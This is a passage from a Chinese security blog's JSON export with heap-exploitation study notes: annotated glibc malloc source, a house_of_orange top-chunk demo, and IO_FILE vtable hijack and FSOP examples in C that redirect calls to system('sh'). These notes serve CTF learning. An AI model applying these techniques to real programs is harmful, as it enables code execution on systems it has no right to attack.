中的fd_nextsize和bk_nextsize位</span></span><br><span class=\"line\">        remainder-&gt;bk_nextsize = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    set_head (victim, nb | PREV_INUSE |</span><br><span class=\"line\">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class=\"number\">0</span>));</span><br><span class=\"line\">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class=\"line\">    set_foot (remainder, remainder_size);<span class=\"comment\">//设置remainder的matadata</span></span><br><span class=\"line\"></span><br><span class=\"line\">    check_malloced_chunk (av, victim, nb);<span class=\"comment\">//初始化从last_remainder中切割并返回给用户的chunk空间</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p = chunk2mem (victim);</span><br><span class=\"line\">    alloc_perturb (p, bytes);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​        下面是unsorted bin中不止有一个bin的情况，这时候就直接将chunk unlink。</p>\n<p>​        如果申请的size正好等于此时unsorted bin的size，那么直接设置为used状态并初始化内存，返回用户对应的指针。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (size == nb)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    set_inuse_bit_at_offset (victim, size);<span class=\"comment\">//设置为used</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (av != &amp;main_arena)</span><br><span class=\"line\">      victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class=\"line\">    check_malloced_chunk (av, victim, nb);<span class=\"comment\">//分配chunk内存空间，并初始化</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p = chunk2mem (victim);</span><br><span class=\"line\">    alloc_perturb (p, bytes);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<p>​           </p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">         <span class=\"comment\">/* remove from unsorted list */</span></span><br><span class=\"line\">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class=\"line\">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"comment\">/* Take now instead of binning if exact fit */</span></span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (size == nb)<span class=\"comment\">//如果申请的size正好等于此时unsorted bin的size，那么直接设置为used状态并初始化内存，返回用户对应的指针</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              set_inuse_bit_at_offset (victim, size);</span><br><span class=\"line\">              <span class=\"keyword\">if</span> (av != &amp;main_arena)</span><br><span class=\"line\">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class=\"line\">              check_malloced_chunk (av, victim, nb);</span><br><span class=\"line\">              <span class=\"keyword\">void</span> *p = chunk2mem (victim);</span><br><span class=\"line\">              alloc_perturb (p, bytes);</span><br><span class=\"line\">              <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"comment\">/* place chunk in bin */</span></span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (in_smallbin_range (size))<span class=\"comment\">//如果取出的bin的size位于small bin</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              victim_index = smallbin_index (size);<span class=\"comment\">//获取idx</span></span><br><span class=\"line\">              bck = bin_at (av, victim_index);<span class=\"comment\">//将unsorted bin插入small bin链表中</span></span><br><span class=\"line\">              fwd = bck-&gt;fd;<span class=\"comment\">//</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          <span class=\"keyword\">else</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              victim_index = largebin_index (size);<span class=\"comment\">//同理</span></span><br><span class=\"line\">              bck = bin_at (av, victim_index);</span><br><span class=\"line\">              fwd = bck-&gt;fd;</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"comment\">/* maintain large bins in sorted order */</span></span><br><span class=\"line\">              <span class=\"keyword\">if</span> (fwd != bck)<span class=\"comment\">//如果该链表中已存在空闲chunk</span></span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  <span class=\"comment\">/* Or with inuse bit to speed comparisons */</span></span><br><span class=\"line\">                  size |= PREV_INUSE;<span class=\"comment\">//直接设置next chunk的prev_inuse为1</span></span><br><span class=\"line\">                  <span class=\"comment\">/* if smaller than smallest, bypass loop below */</span></span><br><span class=\"line\">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class=\"number\">0</span>);<span class=\"comment\">//</span></span><br><span class=\"line\">                  <span class=\"keyword\">if</span> ((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>) (size) &lt; (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>) (bck-&gt;bk-&gt;size))<span class=\"comment\">//如果当前chunk的size小于最后一个chunk，则需要将该chunk插入到large bin链表的最后。</span></span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                      fwd = bck;</span><br><span class=\"line\">                      bck = bck-&gt;bk;</span><br><span class=\"line\"></span><br><span class=\"line\">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class=\"line\">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class=\"line\">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                  <span class=\"keyword\">else</span></span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class=\"number\">0</span>);</span><br><span class=\"line\">                      <span class=\"keyword\">while</span> ((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>) size &lt; fwd-&gt;size)<span class=\"comment\">//当size比最小的chunk大的时候，就需要利用while遍历laege bin来寻找插入的位置。</span></span><br><span class=\"line\">                        &#123;</span><br><span class=\"line\">                          fwd = fwd-&gt;fd_nextsize;<span class=\"comment\">//对large bin遍历</span></span><br><span class=\"line\">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class=\"number\">0</span>);</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                      <span class=\"keyword\">if</span> ((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>) size == (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>) fwd-&gt;size)<span class=\"comment\">//size相等的情况</span></span><br><span class=\"line\">                        <span class=\"comment\">/* Always insert in the second position.  */</span></span><br><span class=\"line\">                        fwd = fwd-&gt;fd;<span class=\"comment\">//只需改变victim的及相邻chunk的fd，bk，而不需要改变fd_nextsize等，因为相同大小的chunk只有最低地址的chunk会设置fd_nextsize和bk_nextsize指针。</span></span><br><span class=\"line\">                      <span class=\"keyword\">else</span></span><br><span class=\"line\">                        &#123;</span><br><span class=\"line\">                          victim-&gt;fd_nextsize = fwd;<span class=\"comment\">//类似上面</span></span><br><span class=\"line\">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class=\"line\">                          fwd-&gt;bk_nextsize = victim;</span><br><span class=\"line\">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                      bck = fwd-&gt;bk;<span class=\"comment\">//</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">              <span class=\"keyword\">else</span></span><br><span class=\"line\">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">          mark_bin (av, victim_index);</span><br><span class=\"line\">          victim-&gt;bk = bck;</span><br><span class=\"line\">          victim-&gt;fd = fwd;</span><br><span class=\"line\">          fwd-&gt;bk = victim;</span><br><span class=\"line\">          bck-&gt;fd = victim;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MAX_ITERS       10000</span></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["HEAP - sourcecode analysis"]},{"title":"house_of_orange trick学习","url":"/2022/04/10/heap_learning_house_of_orange/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-FAqoNWHh\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<p>​        多年以后，秃头还记得第一次听梅丽桑德与佩利亚斯的那个下午，德彪西的抽象艺术直接把我整麻了。虽然德彪西真的很好听，但是做题的时候如果一直听德彪西，不协和音程与大量全音阶的使用会让整个人都会变得抽象魔幻起来，最后越做越emo。</p>\n<p>​        此刻因为听了一天抽象音乐而变得呆滞的秃头正打算学习一些轻松愉快的知识来缓解沉闷的气氛，就比如这个久仰大名但是一直没有接触的house of orange。</p>\n<p>​        </p>\n<h2><span id=\"overview\">overview</span></h2><p>​        house of orange，大致就是指在程序没有free功能的情况下，通过攻击top chunk而获得一个free 的unsorted bin。</p>\n<h2><span id=\"利用原理\">利用原理</span></h2><p>​        当bin中没有任何bin满足我们申请的chunk size，top chunk size也小于我们申请的size时，系统会选择通过<code>mmap()</code>或<code>brk()</code>的方式申请更多的空间。</p>\n<p>​        如果我们让堆以<code>brk()</code>的形式拓展，那么原有的top chunk就会被放入unsorted bin链表中，我们的目的就达成了。</p>\n<p>​        那么如何让堆以<code>brk()</code>的方式拓展空间呢？<br>​        首先<code>mamp()</code>分配的话时需要申请的chunk大小满足一定阈值的。这个阈值一般是128k，也就是说我们需要申请的chunk size的第一个需要满足的条件，是小于128k。</p>\n<p>​        其次top chunk结束地址需要页对齐。</p>\n<p>​        size的<code>prev_inuse</code>需要为1。</p>\n<p>​        size需要大于0x10。</p>\n<h3><span id=\"示例\">示例</span></h3><p>源码来源于ctf-wiki</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> fake_size 0x41</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *ptr;</span><br><span class=\"line\"></span><br><span class=\"line\">    ptr=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);</span><br><span class=\"line\">    ptr=(<span class=\"keyword\">void</span> *)((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)ptr+<span class=\"number\">24</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    *((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>*)ptr)=fake_size; <span class=\"comment\">// overwrite top chunk size</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x60</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x60</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​        这个程序是无法执行的，因为这里size并没有进行页对齐。</p>\n<h4><span id=\"页对齐\">页对齐</span></h4><p>​        通俗来说就是伪造的top chunk size的结束地址是0x1000的整数倍。</p>\n<p>​        比如说top chunk起始地址为0x602020，size为0x20fe0，那么结束地址就是0x623000</p>\n<p>，这个数是0x1000的整数倍，就是十进制4096的整数倍，也就是4kb对齐。因此我们需要将top chunk size改得更小点已进行利用的时候，就可以选择类似1fe0，2fe0这样的size。</p>\n<p>​        </p>\n<p>​        所以当我们如此操作后，原本的top chunk就会被放入unsorted bin，当我们下次申请一些chunk的时候，就会从其中进行分割，我们就获得了unsorted chunk。</p>\n<p>​        堆上的利用十分浅显易懂，但是一般来说这个点都会和io_file的fsop结合在一起，那样难度其实就上去了。</p>\n","categories":["Binary_security"],"tags":["HEAP - House Of Orange"]},{"title":"IO_FILE学习","url":"/2022/04/10/heap_learning_io_file/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-OBaIUtpX\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h1><span id=\"overview\">overview</span></h1><h2><span id=\"大致原理\">大致原理</span></h2><p>​        glibc定义了<code>_IO_FILE</code>这样一个结构体来管理io file。io_file结构体里定义了一堆相关的变量，但是真正关键的是其中包含的<code>_IO_FILE_plus</code>结构。 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8。</p>\n<p>​        结构源码如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE_plus</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    _IO_FILE    file;</span><br><span class=\"line\">    IO_jump_t   *vtable;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​        这个结构包含了一个叫<code>vtable</code>的指针，指向实现io函数各种功能的真正函数。我们可以通过劫持这个vtable指针，来getshell或者更进一步利用。</p>\n<p>​        在研究如何利用前，还是需要知道这个结构调用的大致流程，这里以fread为例子简述。</p>\n<h2><span id=\"fread\">fread</span></h2><p>​        具体的源码就不看了，太冗杂了，但是差不多就是一层一层地调用：</p>\n<p>标准IO库中的<code>_IO_fread()</code> —&gt; 子函数<code>_IO_sgetn()</code>—&gt; vtable指针<code>_IO_XSGETN</code>—&gt;函数<code>_IO_file_xsgetn</code></p>\n<p>​        而vtable本身也是一个指针，指向结构体<code>_IO_jump_t</code></p>\n<p>​        <code>_IO_jump_t</code>源码如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_jump_t</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    JUMP_FIELD(<span class=\"keyword\">size_t</span>, __dummy);</span><br><span class=\"line\">    JUMP_FIELD(<span class=\"keyword\">size_t</span>, __dummy2);</span><br><span class=\"line\">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class=\"line\">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class=\"line\">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class=\"line\">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class=\"line\">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class=\"line\">    <span class=\"comment\">/* showmany */</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class=\"line\">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class=\"line\">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class=\"line\">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class=\"line\">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class=\"line\">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class=\"line\">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class=\"line\">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class=\"line\">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class=\"line\">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class=\"line\">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class=\"line\">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class=\"line\">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class=\"line\">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">if</span> 0</span></span><br><span class=\"line\">    get_column;</span><br><span class=\"line\">    set_column;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>这里vtable就像一个中转站，通过它调用<code>_IO_jump_t</code>中的各种函数。</p>\n<p>比如说这里fread就是调用的<code>_IO_file_xsgetn</code>函数。</p>\n<p>值得注意的是调用这个函数之前需要把它从vtable中取出从，然后才跳过去调用<code>_IO_file_xsgetn</code> 函数。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (fp-&gt;_IO_buf_base</span><br><span class=\"line\">        &amp;&amp; want &lt; (<span class=\"keyword\">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (__underflow (fp) == EOF)</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">      &#125;</span><br></pre></td></tr></table></figure>\n<p>函数源码如上，实现的是一个键盘输入。 </p>\n<p>实际上orw三个功能的原理都差不多，都是经过vtable指针调用函数。只是最后的功能有区别而已。</p>\n<h1><span id=\"vtable攻击\">vtable攻击</span></h1><h3><span id=\"大致分析\">大致分析</span></h3><p>​        在刚在的fread调用分析中我们认识到vtable实际上就是一个中转站，如果我们能够控制这个中转站的内容，我们也就相应地能够控制程序进行一些奇怪的操作了。</p>\n<p>​        那么应该如何伪造vtable呢？<br>​        目前有两种思路。</p>\n<p>​        一种是直接修改vtable中的指针，进行一个任意地址读写，第二种是覆盖 vtable 的指针，使其指向一段可控的内存空间，也就相当于伪造vtable。</p>\n<p>​        在libc2.24及以后的版本vtable被改为只读，所以只能用第二种方法，也就是伪造vtable。</p>\n<h3><span id=\"修改vtable内容\">修改VTABLE内容</span></h3><p>​        libc-2.23以前的版本都可以使用这个方法来攻击。(不包括2.23)</p>\n<p>​        首先需要找到vtable的地址，vtable位于<code>_IO_FILE_plus</code>中，对于64位环境，vtable与<code>_IO_FILE_plus</code>中有固定的偏移，为0xd8。<code>_IO_FILE_plus</code>的地址，对于 fopen 的情况下是位于堆内存，对于 stdin\\stdout\\stderr 是位于 libc.so 中。</p>\n<p>​        接着需要知道我们想要劫持的函数在vtable中是具体调用哪一个函数，比如说<code>printf()</code>则是调用vtable中的<code>xspun</code>，于是我们查询这个函数对应的vtable中的偏移，并修改对应指针就行。</p>\n<p>​        劫持指针的一个大致的操作。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">vtable_ptr=*(<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>*)((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)fp+<span class=\"number\">0xd8</span>);     <span class=\"comment\">//get vtable</span></span><br><span class=\"line\">vtable_ptr[<span class=\"number\">7</span>]=<span class=\"number\">0x41414141</span> <span class=\"comment\">//xsputn</span></span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;call 0x41414141&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>​        如果要给劫持的函数传参，就需要根据不同的io函数，构造不同的地址。比如说我们劫持了printf函数，而这个函数正常情况下被传入的第一个参数是对应的_IO_FILE_plus 地址，也就是_IO_2_1_stdout_的地址，所以我们可以这样操作：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">  FILE *fp;</span><br><span class=\"line\">  <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> *vtable_ptr;</span><br><span class=\"line\">  fp=fopen(<span class=\"string\">&quot;123.txt&quot;</span>,<span class=\"string\">&quot;rw&quot;</span>);</span><br><span class=\"line\">  vtable_ptr=*(<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>*)((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)fp+<span class=\"number\">0xd8</span>); </span><br><span class=\"line\">memcopy(fp,<span class=\"string\">&quot;sh&quot;</span>,<span class=\"number\">3</span>);</span><br><span class=\"line\">  vtable_ptr[<span class=\"number\">7</span>]=system_ptr <span class=\"comment\">//xsputn</span></span><br><span class=\"line\">  fwrite(<span class=\"string\">&quot;hi&quot;</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,fp);</span><br></pre></td></tr></table></figure>\n<h3><span id=\"伪造vtable\">伪造VTABLE</span></h3><p>​        示例来源于ctf-wiki</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> system_ptr 0x7ffff7a52390;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    FILE *fp;</span><br><span class=\"line\">    <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> *vtable_addr,*fake_vtable;</span><br><span class=\"line\"></span><br><span class=\"line\">    fp=fopen(<span class=\"string\">&quot;123.txt&quot;</span>,<span class=\"string\">&quot;rw&quot;</span>);</span><br><span class=\"line\">    fake_vtable=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x40</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    vtable_addr=(<span class=\"keyword\">long</span> <span class=\"keyword\">long</span> *)((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)fp+<span class=\"number\">0xd8</span>);     <span class=\"comment\">//vtable offset</span></span><br><span class=\"line\"></span><br><span class=\"line\">    vtable_addr[<span class=\"number\">0</span>]=(<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)fake_vtable;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>(fp,<span class=\"string\">&quot;sh&quot;</span>,<span class=\"number\">3</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    fake_vtable[<span class=\"number\">7</span>]=system_ptr; <span class=\"comment\">//xsputn</span></span><br><span class=\"line\"></span><br><span class=\"line\">    fwrite(<span class=\"string\">&quot;hi&quot;</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,fp);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​        就是在覆盖vtable指针为fake vatble，指定对应偏移调用函数为<code>system()</code>，并利用之前说到的传参方式传入参数。</p>\n<h2><span id=\"fsop\">FSOP</span></h2><h3><span id=\"大致思路\">大致思路</span></h3><p>​        当程序执行退出，或者从main函数返回，或者libc abort的时候，就会执行<code>_IO_flush_all_lockp</code>这个函数，而这个函数又会调用vtable中的<code>_IO_overflow</code>，按照之前vtable攻击的思路，我们也许能将这个函数改为<code>one_gadget</code>或者其他什么getshell的东西。</p>\n<p>​        我们的实际目的就是修改vtable中的<code>_IO_overflow</code>，但是一般来说程序并不会使我们能够轻易地直接修改vtable的值，或者伪造vtable，难点就是我们很难直接覆盖<code>_IO_FILE_plus</code>中的指针为我们想要的值，既然覆盖做不到，那么伪造不失为一个办法。</p>\n<p>​        那么我们就需要以<code>_IO_FILE_plus</code>为单位伪造。在正常情况下，维护文件系统的链表头节点为 <code>_IO_list_all</code>，并且这个头节点作为全局变量被储存在libc中。<code>_IO_list_all</code>指向的每一个节点都是一个<code>_IO_FILE_plus</code>，所以如果我们能够覆盖<code>_IO_list_all</code>,使其指向我们伪造的<code>_IO_FILE_plus</code>，就能够劫持vtable，从而实现对于vtable表项的修改。</p>\n<h3><span id=\"具体操作\">具体操作</span></h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> _IO_list_all 0x7ffff7dd2520</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> mode_offset 0xc0</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> writeptr_offset 0x28</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> writebase_offset 0x20</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> vtable_offset 0xd8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *ptr;</span><br><span class=\"line\">    <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> *list_all_ptr;</span><br><span class=\"line\"></span><br><span class=\"line\">    ptr=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x200</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    *(<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>*)((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)ptr+mode_offset)=<span class=\"number\">0x0</span>;</span><br><span class=\"line\">    *(<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>*)((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)ptr+writeptr_offset)=<span class=\"number\">0x1</span>;</span><br><span class=\"line\">    *(<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>*)((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)ptr+writebase_offset)=<span class=\"number\">0x0</span>;</span><br><span class=\"line\">    *(<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>*)((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)ptr+vtable_offset)=((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)ptr+<span class=\"number\">0x100</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    *(<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>*)((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)ptr+<span class=\"number\">0x100</span>+<span class=\"number\">24</span>)=<span class=\"number\">0x41414141</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    list_all_ptr=(<span class=\"keyword\">long</span> <span class=\"keyword\">long</span> *)_IO_list_all;</span><br><span class=\"line\"></span><br><span class=\"line\">    list_all_ptr[<span class=\"number\">0</span>]=ptr;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​        还是wiki上的一个简单的例子。</p>\n<p>​        伪造<code>_IO_FILE_plus</code>还是需要绕过比较多的检测的。检测的源码如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">f (((fp-&gt;_mode &lt;= <span class=\"number\">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class=\"line\">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class=\"line\">           &#123;</span><br><span class=\"line\">               result = EOF;</span><br><span class=\"line\">          &#125;</span><br></pre></td></tr></table></figure>\n<p>​        也就是</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">fp-&gt;_mode &lt;= <span class=\"number\">0</span> </span><br><span class=\"line\">fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br></pre></td></tr></table></figure>\n<p>​        所以在示例中，三个偏移指向的值都满足了检测的条件，也就能成功执行了。</p>\n","categories":["Binary_security"],"tags":["io_file"]},{"title":"UNLINK","url":"/2022/04/05/heap_learning_unlink/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-NLGmvTLA\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>     \n<h1><span id=\"0\">0:</span></h1><p>​        还是一个旧的笔记的内容增加以及纠错。这篇我也不记得是什么时候写的了，也是半年前吧。</p>\n<h1><span 